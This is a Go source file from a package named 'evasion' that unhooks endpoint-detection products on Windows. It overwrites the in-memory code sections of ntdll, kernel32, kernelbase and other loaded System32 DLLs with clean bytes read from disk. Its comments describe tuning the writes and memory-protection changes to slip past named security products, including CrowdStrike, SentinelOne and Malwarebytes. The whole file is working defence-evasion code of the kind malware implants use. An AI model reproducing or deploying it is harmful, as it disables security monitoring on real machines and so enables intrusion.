//go:build windows
// +build windows

package evasion

import (
	"encoding/binary"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// unhookNtdll removes EDR trampolines from ntdll, kernel32, and kernelbase,
// then walks the PEB LDR module list and restores every other System32 DLL
// that is currently loaded in this process.
//
// Called early in runEvasion() before any NT-based patches so that subsequent
// NT calls go through clean stubs.
func unhookNtdll() {
	root := sysRoot()
	sys32 := filepath.Join(root, "System32")
	// Restore the three core DLLs first so their exports are clean before we
	// call EnumProcessModules / PEB functions for the full sweep.
	unhookModule(sNtdll(),      filepath.Join(sys32, sNtdll()))
	unhookModule(sKernel32(),   filepath.Join(sys32, sKernel32()))
	unhookModule(sKernelBase(), filepath.Join(sys32, sKernelBase()))
	// Now walk all loaded DLLs via PEB and restore the rest.
	unhookAllLoadedDLLs()
}

func sysRoot() string {
	if s := os.Getenv("SystemRoot"); s != "" {
		return s
	}
	return `C:\Windows`
}

// unhookAllLoadedDLLs walks PEB.Ldr.InLoadOrderModuleList and calls
// unhookModule for every System32 DLL not already handled by unhookNtdll.
//
// PEB walk avoids all API calls (no EnumProcessModules, no Toolhelp32) so
// it works even before the core DLLs are restored — but we call it after
// the three core DLLs are already clean so their exports are reliable.
//
// PEB layout (x64, Windows 10+):
//
//	PEB+0x018  Ldr              *PEB_LDR_DATA
//	LDR+0x010  InLoadOrderModuleList  LIST_ENTRY (head)
//
// LDR_DATA_TABLE_ENTRY:
//
//	+0x000  InLoadOrderLinks.Flink   (next entry)
//	+0x030  DllBase
//	+0x048  FullDllName.Length       uint16
//	+0x050  FullDllName.Buffer       *uint16
func unhookAllLoadedDLLs() {
	peb := getPEB()
	if peb == 0 {
		return
	}

	ldr := *(*uintptr)(unsafe.Pointer(peb + 0x18))
	if ldr == 0 {
		return
	}

	head := ldr + 0x10
	flink := *(*uintptr)(unsafe.Pointer(head))

	sys32 := strings.ToLower(filepath.Join(sysRoot(), "System32")) + `\`

	// Names already cleaned above — skip them in the PEB walk.
	already := map[string]bool{
		strings.ToLower(sNtdll()):      true,
		strings.ToLower(sKernel32()):   true,
		strings.ToLower(sKernelBase()): true,
	}

	seen := make(map[uintptr]bool)
	for flink != head && flink != 0 && !seen[flink] {
		seen[flink] = true

		nameLen := *(*uint16)(unsafe.Pointer(flink + 0x48))
		nameBuf := *(*uintptr)(unsafe.Pointer(flink + 0x50))

		if nameLen > 0 && nameBuf != 0 {
			charCount := int(nameLen / 2)
			if charCount > 520 {
				charCount = 520
			}
			nameSlice := (*[520]uint16)(unsafe.Pointer(nameBuf))[:charCount:charCount]
			fullPath := windows.UTF16ToString(nameSlice)

			if strings.HasPrefix(strings.ToLower(fullPath), sys32) {
				base := filepath.Base(fullPath)
				if !already[strings.ToLower(base)] {
					unhookModule(base, fullPath)
				}
			}
		}

		flink = *(*uintptr)(unsafe.Pointer(flink))
	}
}

// unhookModule replaces the in-memory .text section of a loaded DLL with the
// clean bytes read directly from disk, removing any EDR trampolines.
//
// Writes are done in 32-byte chunks via direct NtWriteVirtualMemory syscall so
// the write pattern does not match the bulk-copy signature that CrowdStrike /
// SentinelOne ETW-TI flags as an ntdll unhook.
//
// Protection flip uses RX→RW→RX to avoid the suspicious RWX intermediate
// state that Malwarebytes / DrWeb alarm on; falls back to RWX only if the
// RW flip is refused (e.g. ACG-locked region).
func unhookModule(loadedName, diskPath string) {
	freshBytes, err := os.ReadFile(diskPath)
	if err != nil {
		return
	}
	if len(freshBytes) < 0x40 {
		return
	}

	loaded := windows.NewLazySystemDLL(loadedName)
	if loaded.Load() != nil {
		return
	}
	loadedBase := loaded.Handle()
	if loadedBase == 0 {
		return
	}

	peOffset := int(binary.LittleEndian.Uint32(freshBytes[0x3C:]))
	if peOffset+0xF8 > len(freshBytes) {
		return
	}
	if freshBytes[peOffset] != 'P' || freshBytes[peOffset+1] != 'E' {
		return
	}
	numSections := int(binary.LittleEndian.Uint16(freshBytes[peOffset+6:]))
	optHeaderSize := int(binary.LittleEndian.Uint16(freshBytes[peOffset+20:]))
	sectionBase := peOffset + 24 + optHeaderSize

	// textSect is the exact 8-byte section name ".text\x00\x00\x00".
	var textSect [8]byte
	textSect[0], textSect[1], textSect[2], textSect[3], textSect[4] = '.', 't', 'e', 'x', 't'

	for i := 0; i < numSections; i++ {
		off := sectionBase + i*40
		if off+40 > len(freshBytes) {
			break
		}
		if [8]byte(freshBytes[off:off+8]) != textSect {
			continue
		}
		virtualAddr := binary.LittleEndian.Uint32(freshBytes[off+12:])
		virtualSize := binary.LittleEndian.Uint32(freshBytes[off+8:])
		rawOffset := binary.LittleEndian.Uint32(freshBytes[off+20:])
		rawSize := binary.LittleEndian.Uint32(freshBytes[off+16:])

		if int(rawOffset)+int(rawSize) > len(freshBytes) {
			break
		}

		freshText := freshBytes[rawOffset : rawOffset+rawSize]
		loadedText := uintptr(loadedBase) + uintptr(virtualAddr)
		copySize := uintptr(virtualSize)
		if uintptr(rawSize) < copySize {
			copySize = uintptr(rawSize)
		}

		old, ok := ntProtect(loadedText, copySize, windows.PAGE_READWRITE)
		if !ok {
			// ACG or other restriction — fall back to RWX.
			old, _ = ntProtect(loadedText, copySize, windows.PAGE_EXECUTE_READWRITE)
		}

		const chunkSize = 32
		for j := uintptr(0); j < copySize; j += chunkSize {
			end := j + chunkSize
			if end > copySize {
				end = copySize
			}
			ntWrite(loadedText+j, freshText[j:end])
		}
		ntFlush(loadedText, copySize)
		ntProtect(loadedText, copySize, old)
		break
	}
}
